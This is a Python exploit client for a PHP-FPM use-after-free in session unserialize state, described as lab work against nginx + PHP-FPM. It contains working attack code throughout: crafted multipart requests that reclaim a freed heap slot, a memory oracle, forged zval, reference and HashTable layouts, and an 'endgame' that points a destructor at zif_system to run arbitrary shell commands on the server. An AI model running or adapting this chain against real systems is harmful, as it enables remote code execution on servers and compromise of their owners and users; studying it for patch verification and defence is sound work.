#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell_fpm.py — CVE-2026-109619 exploitation client for nginx + PHP-FPM.

The upstream Apache chain (progress-cache UAF, vendor exploit.py stages 1-3)
needs a pre-RINIT OOM, which on FPM kills the worker (fpm_main.c:1871 ->
FPM_EXIT_SOFTWARE).  The FPM-viable primitive is the cross-request
BG(unserialize) stale state:

  producer A   GET app.php + Cookie PHPSESSID=<big-session>
               -> session_start() decodes a ~4MB session post-RINIT -> OOM
               -> php_execute_script's zend_try catches the bailout, the
                  worker survives, BG(unserialize) keeps {level=1, data=d}
                  pointing at the (teardown-freed) 8216-byte struct.
  consumer B   multipart POST (pre-RINIT): the rfc1867 handler runs inside
               php_hash_environment(), i.e. BEFORE zend_activate_modules()
               (main.c:1873-1874) where PHP_RINIT(basic) would memset BG.
               php_session_initialize() -> php_session_decode() ->
               php_var_unserialize_init() reuses d.  B reclaims d's slot with
               a controlled buffer and plants a forged var_entries.

Lab-only aid: the /proc/<pid>/mem oracle reads BG(unserialize).data (d),
the worker's PIE base and buffer addresses, making the reclaim deterministic
to calibrate.  `no-oracle` removes that oracle from the exploit path: it takes the two
absolute bases from an HTTP-only stale-string OOB leak, from --chunk/--pie,
or from /proc/<pid>/maps, then brute-forces the two struct slots.

Subcommands:
  lifecycle        worker-death matrix (pre- vs post-RINIT OOM)
  oracle           print worker pid, pie base, chunk base, d, level
  build-oom        builder-pool POST -> ~4MB session file (cleanup=Off)
  build-ref        builder-pool POST ref.php -> session file with R:2
  producer         one request A (stale BG)
  reclaim-probe    A + patterned B, read back d via oracle (sweep pad sizes)
  primitive        A + B with forged benign var_entries (observable via app.php)
  endgame          A + B with forged ref/array/zif_system chain (RCE proof file)
  leak             HTTP-only chunk/PIE leak from a stale session string
  no-oracle        endgame without /proc/<pid>/mem (HTTP leak, --chunk/--pie,
                   or local maps)
  chain            full pipeline (primitive or endgame phase)
  patchcheck       run lifecycle+oracle+producer+probe on 8.4.26 vs 8.4.27
"""

from __future__ import annotations

import argparse
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
LAB = os.path.join(ROOT, "lab", "fpm")
RUNTIME = os.path.join(LAB, "runtime")

BG_UNSERIALIZE_DATA_OFF = 872   # offsetof(php_basic_globals, unserialize.data)
BG_UNSERIALIZE_LEVEL_OFF = 880
MEM_CHUNK = 0x200000

OOM_SID = b"fmroom000000000001"
REF_SID = b"fpmref000000000001"


# --------------------------------------------------------------------------- #
# http
# --------------------------------------------------------------------------- #

class Target:
    def __init__(self, url: str, timeout: float = 60.0):
        u = urllib.parse.urlsplit(url)
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or 80
        self.path = u.path or "/"
        self.timeout = timeout

    def _connect(self) -> socket.socket:
        sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        return sock

    def _exch(self, request: bytes, read_cap: int = 1 << 22,
              timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
        sock = self._connect()
        sock.settimeout(timeout or self.timeout)
        try:
            sock.sendall(request)
            data = bytearray()
            while len(data) < read_cap:
                try:
                    chunk = sock.recv(65536)
                except OSError:
                    break
                if not chunk:
                    break
                data.extend(chunk)
        finally:
            sock.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        lines = head.decode("latin1", "replace").split("\r\n")
        status = 0
        if lines and re.match(r"HTTP/1\.[01] \d{3}", lines[0]):
            status = int(lines[0].split()[1])
        headers: dict[str, str] = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        return status, headers, body

    def get(self, path: str, cookie: bytes | None = None,
            read_cap: int = 1 << 22) -> tuple[int, dict[str, str], bytes]:
        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
        req = (f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               f"{extra}Connection: close\r\n\r\n").encode()
        return self._exch(req, read_cap=read_cap)

    def post_multipart(self, parts: list[dict], boundary: bytes,
                       cookie: bytes | None = None,
                       read_cap: int = 1 << 22,
                       timeout: float | None = None) -> tuple[int, dict[str, str], bytes]:
        body = build_multipart(parts, boundary)
        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
        req = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               f"{extra}"
               f"Content-Type: multipart/form-data; boundary={boundary.decode('latin1')}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
        return self._exch(req, read_cap=read_cap, timeout=timeout)

    def post_urlencoded(self, fields: dict[str, str],
                        cookie: bytes | None = None,
                        path: str | None = None) -> tuple[int, dict[str, str], bytes]:
        body = urllib.parse.urlencode(fields).encode()
        extra = f"Cookie: {cookie.decode('latin1')}\r\n" if cookie else ""
        req = (f"POST {path or self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
               f"{extra}Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
        return self._exch(req)


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        name = part["name"] if isinstance(part["name"], bytes) else part["name"].encode("latin1")
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if part.get("filename") is not None:
            fname = (part["filename"] if isinstance(part["filename"], bytes)
                     else part["filename"].encode("latin1"))
            out += b'; filename="' + fname + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        data = part["data"] if isinstance(part["data"], bytes) else part["data"].encode("latin1")
        out += b"\r\n\r\n" + data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def parse_sid(header_value: str) -> bytes:
    return urllib.parse.unquote_to_bytes(header_value.split(";")[0].strip())


# --------------------------------------------------------------------------- #
# oracle (/proc/<pid>/mem, lab-only)
# --------------------------------------------------------------------------- #

def fpm_prefix(version: str) -> str:
    return os.path.join(RUNTIME, f"php-{version}")


def find_pool_worker(version: str, pool: str) -> int | None:
    marker = f"php-fpm: pool {pool}".encode()
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        try:
            with open(f"/proc/{name}/cmdline", "rb") as handle:
                data = handle.read()
        except OSError:
            continue
        if marker not in data:
            continue
        # workers of every build look alike; match the binary path
        exe = os.readlink(f"/proc/{name}/exe")
        if f"php-{version}" in exe:
            return int(name)
    return None


class Oracle:
    def __init__(self, version: str, pool: str = "chain"):
        self.version = version
        self.pid = find_pool_worker(version, pool)
        if self.pid is None:
            raise RuntimeError(f"no php-fpm '{pool}' worker for {version}")
        self.maps = self._read_maps()
        self.pie_base = self._pie_base()
        self.bg = self.pie_base + self._symbol("basic_globals")
        self.zif = self.pie_base + self._symbol("zif_system")
        self.dtor = self.pie_base + self._symbol("zval_ptr_dtor")

    def _read_maps(self) -> list[tuple[int, int, str]]:
        out = []
        with open(f"/proc/{self.pid}/maps", encoding="utf-8") as handle:
            for line in handle:
                rng, perms, *rest = line.split()
                start_s, end_s = rng.split("-")
                out.append((int(start_s, 16), int(end_s, 16), perms))
        return out

    def _pie_base(self) -> int:
        exe = os.readlink(f"/proc/{self.pid}/exe")
        with open(f"/proc/{self.pid}/maps", encoding="utf-8") as handle:
            base = None
            for line in handle:
                parts = line.split()
                if parts[-1] != exe:
                    continue
                start = int(parts[0].split("-")[0], 16)
                if base is None or start < base:
                    base = start
        if base is None:
            raise RuntimeError("pie base not found")
        return base

    def _symbol(self, name: str) -> int:
        binary = os.readlink(f"/proc/{self.pid}/exe")
        result = subprocess.run(["nm", binary], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[-1] == name:
                return int(parts[0], 16)
        raise RuntimeError(f"symbol {name} not found")

    def read(self, addr: int, size: int) -> bytes:
        with open(f"/proc/{self.pid}/mem", "rb") as handle:
            handle.seek(addr)
            return handle.read(size)

    def u64(self, addr: int) -> int:
        return struct.unpack("<Q", self.read(addr, 8))[0]

    def u32(self, addr: int) -> int:
        return struct.unpack("<I", self.read(addr, 4))[0]

    def unserialize_data(self) -> int:
        return self.u64(self.bg + BG_UNSERIALIZE_DATA_OFF)

    def unserialize_level(self) -> int:
        return self.u32(self.bg + BG_UNSERIALIZE_LEVEL_OFF)

    def chunk_base(self, addr: int) -> int | None:
        for start, end, perms in self.maps:
            if start <= addr < end and "rw-p" in perms and end - start == MEM_CHUNK:
                return start
        return None

    def refresh(self) -> None:
        self.maps = self._read_maps()

    def dump(self) -> None:
        d = self.unserialize_data()
        level = self.unserialize_level()
        chunk = self.chunk_base(d) if d else None
        print(f"worker      pid={self.pid}")
        print(f"pie_base    0x{self.pie_base:x}")
        print(f"basic_glob  0x{self.bg:x}")
        print(f"zif_system  0x{self.zif:x}")
        print(f"zval_ptrdtor 0x{self.dtor:x}")
        print(f"BG.data     0x{d:x}  level={level}")
        print(f"chunk_base  {('0x%x' % chunk) if chunk else None}")


# --------------------------------------------------------------------------- #
# lab helpers
# --------------------------------------------------------------------------- #

def session_file(version: str, sid: bytes) -> str:
    return os.path.join(fpm_prefix(version), "session", f"sess_{sid.decode('latin1')}")


def big_session_post(builder: Target, sid: bytes, size: int) -> tuple[int, bytes]:
    """Progress-key 4MB string -> session file with a huge key (cleanup=Off)."""
    parts = [
        {"name": "PHPSESSID", "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"A" * size},
        {"name": "f", "filename": "a.txt", "data": b"x" * 16},
    ]
    status, headers, body = builder.post_multipart(parts, b"BOUNDSZ16", timeout=180.0)
    return status, body


def ref_session_post(builder: Target, sid: bytes) -> tuple[int, bytes]:
    """ref.php stores $_SESSION['r'] =& $_SESSION['a'] -> 'R:2' in the file."""
    status, _headers, body = builder.post_urlencoded(
        {"x": "1"}, cookie=b"PHPSESSID=" + sid, path="/ref.php")
    return status, body


def producer_get(chain: Target, sid: bytes) -> tuple[int, bytes]:
    status, _headers, body = chain.get("/app.php", cookie=b"PHPSESSID=" + sid)
    return status, body


# --------------------------------------------------------------------------- #
# shared exploit pipeline
# --------------------------------------------------------------------------- #

def _arm_stale(base: Target, builder: Target, oracle: Oracle, size: int) -> int:
    """Rebuild the OOM session (php_session_cancel_decode unlinked it during
    the previous bailout), fire the producer, return stale BG.data.

    Note: any later request that reaches RINIT memsets BG(basic), so the
    stale state must be re-armed immediately before the consume."""
    big_session_post(builder, OOM_SID, size)
    producer_get(base, OOM_SID)
    d = oracle.unserialize_data()
    if not d or oracle.unserialize_level() != 1:
        raise RuntimeError("stale state not armed")
    return d


def _probe_cover(chain404: Target, oracle: Oracle, d: int, need: int,
                 size: int = 12288) -> int | None:
    """Land a patterned reclaim buffer (3x4096 pads + one big field) over d
    against a 404 endpoint, scan the mem chunk for the unique marker, and
    return the content offset K such that buffer+K == d."""
    chunk = oracle.chunk_base(d)
    if chunk is None:
        return None
    # Unique marker: the heap retains freed buffer contents across requests,
    # so a fixed marker could match a stale copy from a previous run.
    marker = b"MK" + os.urandom(6)
    content = bytearray(b"\x00" * size)
    content[0:8] = marker
    parts = [{"name": f"pad{i}", "data": b"C" * 4096} for i in range(3)]
    parts.append({"name": "big", "data": bytes(content)})
    chain404.post_multipart(parts, b"PRBLAND1")
    oracle.refresh()
    data = oracle.read(chunk, MEM_CHUNK)
    hits, idx = [], 0
    while True:
        pos = data.find(marker, idx)
        if pos < 0:
            break
        hits.append(pos)
        idx = pos + 1
    d_off = d - chunk
    cover = [h for h in hits if h <= d_off and d_off + need <= h + size]
    if not cover:
        print(f"[!] no covering reclaim buffer (hits={[hex(h) for h in hits]})")
        return None
    k = d_off - cover[0]
    print(f"[*] d=0x{d:x} reclaim covers d at content off {k:#x}")
    return k


def _rebuild_ref_and_arm(base: Target, builder: Target, oracle: Oracle,
                         oom_size: int) -> int:
    """Rebuild the ref session (a failed consume saves the corrupted decode
    back to the file), re-arm the stale state, and return the re-armed d."""
    ref_session_post(builder, REF_SID)
    return _arm_stale(base, builder, oracle, oom_size)


def _consume_b(chainapp: Target, forged: bytes) -> tuple[int, dict[str, str], bytes]:
    """Consume with the forged reclaim buffer.

    Consumer B MUST carry the PHP_SESSION_UPLOAD_PROGRESS field and a file
    part: rfc1867 has to fire the pre-RINIT session_start, otherwise the
    decode would run post-RINIT against a memset BG(unserialize)."""
    parts = [{"name": f"pad{i}", "data": b"C" * 4096} for i in range(3)]
    parts.append({"name": "big", "data": forged})
    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
    parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
    status, headers, body = chainapp.post_multipart(parts, b"CONSUME01",
                                                    cookie=b"PHPSESSID=" + REF_SID)
    print(f"[*] consumer status={status}")
    return status, headers, body


# --------------------------------------------------------------------------- #
# subcommands
# --------------------------------------------------------------------------- #

def cmd_lifecycle(args) -> int:
    chain = Target(args.base)
    version = args.version
    worker = find_pool_worker(version, "chain")
    print(f"[*] chain worker before: {worker}")

    # pre-RINIT OOM: big multipart POST to index.php (no session, body parse
    # happens inside php_request_startup -> bailout -> FPM_EXIT_SOFTWARE)
    parts = [{"name": f"p{i:04d}", "data": b"V" * (1 << 20)} for i in range(10)]
    status, _h, body = chain.post_multipart(parts, b"PRERINIT1", timeout=60.0)
    time.sleep(0.4)
    worker2 = find_pool_worker(version, "chain")
    print(f"[A] pre-RINIT OOM:  status={status} worker {worker} -> {worker2} "
          f"({'DIED' if worker != worker2 else 'survived'}) body={body[:60]!r}")

    # post-RINIT OOM: producer (needs a big session; build one if missing)
    if not os.path.isfile(session_file(version, OOM_SID)):
        builder = Target(args.builder)
        print("[*] building oom session (4MB) ...")
        big_session_post(builder, OOM_SID, 4 << 20)
    worker3 = find_pool_worker(version, "chain")
    status, body = producer_get(chain, OOM_SID)
    time.sleep(0.2)
    worker4 = find_pool_worker(version, "chain")
    print(f"[B] post-RINIT OOM: status={status} worker {worker3} -> {worker4} "
          f"({'DIED' if worker3 != worker4 else 'survived'})")
    print(f"    body head: {body[:120]!r}")
    return 0


def cmd_oracle(args) -> int:
    oracle = Oracle(args.version, pool="chain")
    oracle.dump()
    return 0


def cmd_build_oom(args) -> int:
    builder = Target(args.builder)
    sid = args.sid.encode("latin1")
    status, _body = big_session_post(builder, sid, args.size)
    path = session_file(args.version, sid)
    size = os.path.getsize(path) if os.path.isfile(path) else -1
    print(f"builder status={status} session_file={path} size={size}")
    return 0 if size > args.size else 1


def cmd_build_ref(args) -> int:
    builder = Target(args.builder)
    sid = REF_SID
    status, body = ref_session_post(builder, sid)
    path = session_file(args.version, sid)
    content = open(path, "rb").read() if os.path.isfile(path) else b""
    print(f"builder status={status} body={body[:40]!r}")
    print(f"session_file={path} content={content!r}")
    return 0 if b"R:2" in content else 1


def cmd_producer(args) -> int:
    chain = Target(args.base)
    sid = args.sid.encode("latin1")
    before = find_pool_worker(args.version, "chain")
    status, _headers, body = chain.get("/app.php", cookie=b"PHPSESSID=" + sid)
    time.sleep(0.2)
    after = find_pool_worker(args.version, "chain")
    print(f"producer status={status} worker {before} -> {after} "
          f"({'DIED' if before != after else 'survived'})")
    print(f"body: {body[:160]!r}")
    if args.oracle and before == after and before:
        oracle = Oracle(args.version)
        print(f"BG.data=0x{oracle.unserialize_data():x} "
              f"level={oracle.unserialize_level()}")
    return 0


def _hexdump(data: bytes, base: int, limit: int = 96) -> str:
    lines = []
    for off in range(0, min(len(data), limit), 16):
        chunk = data[off:off + 16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        lines.append(f"  0x{base + off:012x}  {hexs}")
    return "\n".join(lines)


def cmd_reclaim_probe(args) -> int:
    chain = Target(args.base)
    builder = Target(args.builder)
    oracle = Oracle(args.version)
    pads = ([int(x) for x in args.sweep.split(",")] if args.sweep
            else [args.pad])
    for pad in pads:
        # The producer OOM runs php_session_cancel_decode -> session_destroy,
        # which UNLINKS the OOM session file: rebuild it every iteration.
        big_session_post(builder, OOM_SID, args.size)
        producer_get(chain, OOM_SID)
        d = oracle.unserialize_data()
        level = oracle.unserialize_level()
        if not d or level != 1:
            print(f"[!] pad={pad}: stale state not armed (d=0x{d:x} level={level})")
            continue
        marker = b"PAT" + f"{pad:05d}".encode() + b"!" * 5
        big_value = (marker + b"Q" * 8214)[:8214]
        filename = (marker + b"Q" * 8214)[:8214]
        for shape in ("field", "filename", "field-first"):
            # No PHPSESSID cookie and no progress field: B must NOT decode a
            # session (a garbage forged struct would crash var_push).  The
            # reclaim allocations happen inside rfc1867 during request
            # startup; app.php then starts a fresh empty session (no decode).
            if shape == "field":
                parts: list[dict] = []
                if pad:
                    parts.append({"name": "pad", "data": b"C" * pad})
                parts.append({"name": "big", "data": big_value})
            elif shape == "filename":
                parts = [{"name": "N" * 64, "filename": filename, "data": b"x" * 8}]
            else:
                parts = []
                if pad:
                    parts.append({"name": "pad", "data": b"C" * pad})
                parts.append({"name": "big", "data": big_value})
                parts.append({"name": "N" * 64, "filename": b"f.bin", "data": b"x" * 8})
            chain.post_multipart(parts, b"PROBE16BB", timeout=60.0)
            try:
                region = oracle.read(d, 96)
            except OSError as exc:
                print(f"[!] pad={pad} shape={shape}: read d failed: {exc}")
                oracle = Oracle(args.version)
                continue
            hit = marker[:8] in region
            print(f"[*] pad={pad} shape={shape:11} d=0x{d:x} "
                  f"level={oracle.unserialize_level()} hit={'YES' if hit else 'no'}")
            if hit:
                print(_hexdump(region, d))
    return 0


def _forged_benign(param_addr: int) -> bytes:
    """8214-byte file-name content: full struct layout with data[1]=FZ long."""
    buf = bytearray(b"\x00" * 8214)
    # +0 last -> param_addr (fake var_entries lives in the param buffer)
    struct.pack_into("<Q", buf, 0, param_addr)
    # +56 entries.used_slots = 8 (so R:2 -> data[1] is inside our data[])
    struct.pack_into("<q", buf, 56, 8)
    # FZ at +0x300: IS_LONG 424242
    fz = param_addr + 0x300  # placeholder; caller rewrites with real d-relative
    struct.pack_into("<Q", buf, 72 + 8, 0)  # data[1] set by caller
    struct.pack_into("<Q", buf, 0x300, 424242)
    struct.pack_into("<I", buf, 0x308, 4)   # IS_LONG
    return bytes(buf)


def cmd_primitive(args) -> int:
    """Arbitrary zval-read primitive: forged var_hash at stale d, session
    'php' decode of the ref session, R:2 -> var_access(1) reads a fake
    IS_LONG zval planted inside the reclaim buffer -> reflected by app.php.

    Reclaim geometry (lab 8.4.26, calibrated at runtime via the oracle):
    3 pad fields of 4096 + one big field of SIZE=16384 place a buffer that
    covers d at content offset K (probed with a marker run against a 404
    endpoint).  The consumer B MUST carry a file part after the progress
    field, otherwise rfc1867 never fires the pre-RINIT session_start and
    the decode would run post-RINIT against a memset BG.

    The per-request heap recycles the 8216-byte slot at one of two addresses;
    if the re-armed consume d differs from the probed d, retry (the pair
    stabilizes after at most one mismatch)."""
    base = Target(args.base)
    chain404 = Target(args.base + "/nope.php")
    chainapp = Target(args.base + "/app.php")
    builder = Target(args.builder)
    oracle = Oracle(args.version)
    size, need = 16384, 0x440

    for _attempt in range(4):
        try:
            d = _arm_stale(base, builder, oracle, args.size)
            k = _probe_cover(chain404, oracle, d, need, size)
            if k is None:
                return 1
            d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
        except (RuntimeError, OSError) as exc:
            print(f"[!] {exc}; refreshing oracle")
            time.sleep(0.4)
            try:
                oracle = Oracle(args.version)
            except RuntimeError as oracle_exc:
                print(f"[!] {oracle_exc}")
                return 1
            continue
        if d2 != d:
            print(f"[*] slot moved 0x{d:x} -> 0x{d2:x}, retrying")
            continue
        forged = bytearray(size)
        struct.pack_into("<Q", forged, k + 0,   d + 56)      # last -> &entries
        struct.pack_into("<Q", forged, k + 8,   d + 0x400)   # first_dtor -> fake
        struct.pack_into("<Q", forged, k + 16,  d + 0x400)   # last_dtor -> fake
        struct.pack_into("<q", forged, k + 48,  64)          # max_depth
        struct.pack_into("<q", forged, k + 56,  2)           # entries.used_slots
        struct.pack_into("<Q", forged, k + 80,  d + 0x300)   # data[1] -> fake zval
        struct.pack_into("<Q", forged, k + 0x300, args.value)
        struct.pack_into("<I", forged, k + 0x308, 4)         # IS_LONG
        struct.pack_into("<q", forged, k + 0x400, 0)         # fake dtor used_slots

        status, _h, body = _consume_b(chainapp, bytes(forged))
        text = body.decode("latin1", "replace")
        print(f"    body: {text[:300]!r}")
        needle = str(args.value).encode()
        ok = needle in body
        print(f"[*] primitive {'OBSERVABLE' if ok else 'not observable'}")
        return 0 if ok else 1
    print("[!] reclaim slot never stabilized")
    return 1


def _build_endgame_payload(d: int, k: int, size: int, zif: int,
                           command: bytes) -> bytes:
    """Build the forged reclaim buffer for the endgame chain.

    Layout (content offsets from K; every absolute address is d-relative):
      K+0x000  decode-time php_unserialize_data (last=&entries, used_slots=2)
      K+0x300  fake zval IS_REFERENCE -> d+0x500
      K+0x400  fake var_dtor_entries (used_slots=0)
      K+0x500  fake zend_reference (rc forged 0; val = fake array zval)
      K+0x700  fake HashTable (rc 1, pDestructor = zif_system)
      K+0x800  fake Bucket doubling as the zif_system execute_data frame
      K+0x880  fake zend_string holding the command
      K+0x8F0  writable scratch for the zif_system return_value
    """
    forged = bytearray(size)
    # decode-time forged struct (identical to the primitive)
    struct.pack_into("<Q", forged, k + 0,   d + 56)       # last -> &entries
    struct.pack_into("<Q", forged, k + 8,   d + 0x400)    # first_dtor -> fake
    struct.pack_into("<Q", forged, k + 16,  d + 0x400)    # last_dtor -> fake
    struct.pack_into("<q", forged, k + 48,  64)           # max_depth
    struct.pack_into("<q", forged, k + 56,  2)            # entries.used_slots
    struct.pack_into("<Q", forged, k + 80,  d + 0x300)    # data[1] -> fake zval
    struct.pack_into("<q", forged, k + 0x400, 0)          # fake dtor used_slots
    # fake zval at d+0x300: IS_REFERENCE -> fake ref at d+0x500
    struct.pack_into("<Q", forged, k + 0x300, d + 0x500)
    struct.pack_into("<I", forged, k + 0x308, 0x10A)      # IS_REFERENCE_EX
    # fake zend_reference at d+0x500: rc forged 0; ZVAL_COPY addrefs -> 1
    struct.pack_into("<I", forged, k + 0x500, 0)          # gc.refcount
    struct.pack_into("<I", forged, k + 0x504, 10)         # gc.type_info IS_REFERENCE
    struct.pack_into("<Q", forged, k + 0x508, d + 0x700)  # ref->val.arr
    struct.pack_into("<I", forged, k + 0x510, 0x307)      # val IS_ARRAY_EX
    struct.pack_into("<Q", forged, k + 0x518, 0)          # sources = NULL
    # fake HashTable at d+0x700: rc 1; session dtor delrefs -> 0 -> fire
    struct.pack_into("<I", forged, k + 0x700, 1)          # gc.refcount
    struct.pack_into("<I", forged, k + 0x704, 7)          # gc.type_info IS_ARRAY
    struct.pack_into("<I", forged, k + 0x708, 0x10)       # HASH_FLAG_STATIC_KEYS
    struct.pack_into("<I", forged, k + 0x70C, 0xFFFFFFF8) # nTableMask (unpacked)
    struct.pack_into("<Q", forged, k + 0x710, d + 0x800)  # arData -> fake bucket
    struct.pack_into("<I", forged, k + 0x718, 1)          # nNumUsed
    struct.pack_into("<I", forged, k + 0x71C, 1)          # nNumOfElements
    struct.pack_into("<I", forged, k + 0x720, 8)          # nTableSize
    struct.pack_into("<Q", forged, k + 0x730, zif)        # pDestructor = zif_system
    # fake Bucket at d+0x800 doubling as the zif_system execute_data frame:
    # bucket.val = IS_STRING -> fake zend_string; E+0x10 return_value ->
    # writable scratch; E+0x2C num_args=1; E+0x50 arg1 zval
    struct.pack_into("<Q", forged, k + 0x800, d + 0x880)  # val.str / opline
    struct.pack_into("<I", forged, k + 0x808, 6)          # val IS_STRING (non-UNDEF)
    struct.pack_into("<Q", forged, k + 0x810, d + 0x8F0)  # h / return_value scratch
    struct.pack_into("<H", forged, k + 0x82C, 1)          # num_args
    struct.pack_into("<Q", forged, k + 0x850, d + 0x880)  # arg1.str
    struct.pack_into("<I", forged, k + 0x858, 0x106)      # arg1 IS_STRING_EX
    # fake zend_string at d+0x880: command (NUL from the zero-filled buffer)
    struct.pack_into("<I", forged, k + 0x880, 1)          # gc.refcount
    struct.pack_into("<I", forged, k + 0x884, 6)          # gc.type_info IS_STRING
    struct.pack_into("<Q", forged, k + 0x890, len(command))
    forged[k + 0x898:k + 0x898 + len(command)] = command
    return bytes(forged)


def cmd_endgame(args) -> int:
    """RCE through a forged HashTable destructor (same reclaim pipeline as
    the primitive; only the fake zval payload changes).

    The fake zval consumed by R:2 is IS_REFERENCE -> fake zend_reference
    (forged rc=0) -> fake IS_ARRAY zval -> fake HashTable with
    pDestructor = zif_system.  The consume's ZVAL_COPY addrefs the fake
    ref 0 -> 1 (the session 'r' entry becomes the only dtored owner; the
    fake zval at d+0x300 is a silent second owner that never gets dtored).
    At consumer-B request rshutdown the session dtor delrefs 1 -> 0 and
    the dtor chain fires:

      zend_reference_destroy(ref)
        i_zval_ptr_dtor(&ref->val)           fake array zval (rc 1 -> 0)
          zend_array_destroy(ht)
            zend_hash_destroy(ht)            pDestructor != ZVAL_PTR_DTOR
              ht->pDestructor(&bucket.val)   = zif_system(fake frame)

    zif_system receives the fake execute_data frame in RDI (the bucket at
    E doubles as the frame: num_args=1 at E+0x2C, arg1 zval at E+0x50
    pointing at a fake zend_string holding the command).  php_exec runs
    the command via popen; the RETVAL write through the bogus RSI
    return_value pointer and the interior efree then abort the worker -
    acceptable: the proof file is already on disk and FPM respawns the
    worker.

    The save that precedes the fire (php_session_flush at rshutdown)
    serializes the fake ref/array safely: php_add_var_hash addrefs the
    fake ref (1 -> 2) and the serialize-var_hash destroy delrefs it back
    (2 -> 1); plain arrays are never addref'd."""
    command = args.command.encode("latin1")
    if not command or b"\x00" in command:
        print("[!] command must be non-empty and contain no NUL bytes")
        return 1
    # fake zend_string at d+0x880 (val at +24) must fit below the scratch
    # zval at d+0x8F0
    if len(command) > 0x57:
        print(f"[!] command too long ({len(command)} > 87 bytes)")
        return 1
    proof = (args.proof_file or "out/p1").lstrip("/")
    base = Target(args.base)
    chain404 = Target(args.base + "/nope.php")
    chainapp = Target(args.base + "/app.php")
    builder = Target(args.builder)
    oracle = Oracle(args.version)
    size, need = 12288, 0x900

    local_proof = os.path.join(LAB, "webroot", proof)
    try:
        os.remove(local_proof)
    except OSError:
        pass

    worker_before = find_pool_worker(args.version, "chain")
    for _attempt in range(4):
        try:
            d = _arm_stale(base, builder, oracle, args.size)
            k = _probe_cover(chain404, oracle, d, need, size)
            if k is None:
                print("[*] probe found no cover; "
                      "falling back to the two-slot no-oracle geometry")
                return cmd_no_oracle(args)
            d2 = _rebuild_ref_and_arm(base, builder, oracle, args.size)
        except (RuntimeError, OSError) as exc:
            # a dead worker (stale /proc pid) or a missed arm: rebuild the
            # oracle against the respawned worker and retry
            print(f"[!] {exc}; refreshing oracle")
            time.sleep(0.4)
            try:
                oracle = Oracle(args.version)
            except RuntimeError as oracle_exc:
                print(f"[!] {oracle_exc}")
                return 1
            continue
        if d2 != d:
            print(f"[*] slot moved 0x{d:x} -> 0x{d2:x}, retrying")
            continue
        forged = _build_endgame_payload(d, k, size, oracle.zif, command)

        status, _h, _body = _consume_b(chainapp, forged)
        print(f"[*] command {command!r} fired (status={status}); waiting for "
              f"worker respawn ...")
        break
    else:
        print("[!] reclaim slot never stabilized")
        return 1

    time.sleep(0.8)
    worker_after = find_pool_worker(args.version, "chain")
    print(f"[*] chain worker {worker_before} -> {worker_after} "
          f"({'died after fire' if worker_before != worker_after else 'still alive'})")
    for _attempt in range(5):
        pstatus, _ph, pbody = base.get("/" + proof)
        if pstatus == 200 and pbody:
            print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
            return 0
        time.sleep(0.4)
    print(f"[!] no proof at /{proof} (last status={pstatus})")
    return 1


def _scan_pattern(oracle: Oracle, pattern: bytes) -> int | None:
    for start, end, perms in oracle.maps:
        if "rw-p" not in perms or end - start != MEM_CHUNK:
            continue
        try:
            data = oracle.read(start, end - start)
        except OSError:
            continue
        off = data.find(pattern)
        if off >= 0:
            return start + off
    return None


def _zif_offset(version: str) -> int:
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    with open(path, encoding="utf-8") as handle:
        return int(json.load(handle)["libphp"]["zif_system"], 16)


def _no_oracle_geometry(
        version: str) -> tuple[int, list[tuple[int, int]], list[int]]:
    fallback = (16384, [(0x81000, 0xFE8), (0x82000, 0x1FE8),
                        (0x81000, 0x1FE8), (0x82000, 0xFE8)],
                [4096, 4096, 4096])
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            fpm = json.load(handle)["fpm"]["no_oracle"]
        return (int(fpm["reclaim_size"]),
                [(int(c["d_off"], 16), int(c["k"], 16))
                 for c in fpm["candidates"]],
                [int(x) for x in fpm.get("reclaim_pads", [4096, 4096, 4096])])
    except (OSError, KeyError, TypeError, ValueError):
        return fallback


def _leak_geometry(version: str) -> dict | None:
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            leak = json.load(handle)["fpm"]["leak"]
    except (OSError, KeyError, TypeError):
        return None
    try:
        return {
            "arm_path": str(leak["arm_path"]),
            "pads": [int(x) for x in leak["pads"]],
            "size": int(leak["size"]),
            "header_content_off": int(leak["header_content_off"], 16),
            "read_len": int(leak["read_len"], 16),
            "chunk_ptr_off": int(leak["chunk_ptr_off"], 16),
            "chunk_base_off": int(leak["chunk_base_off"], 16),
            "pie_ptr_off": int(leak["pie_ptr_off"], 16),
            "pie_base_off": int(leak["pie_base_off"], 16),
        }
    except (KeyError, TypeError, ValueError):
        return None


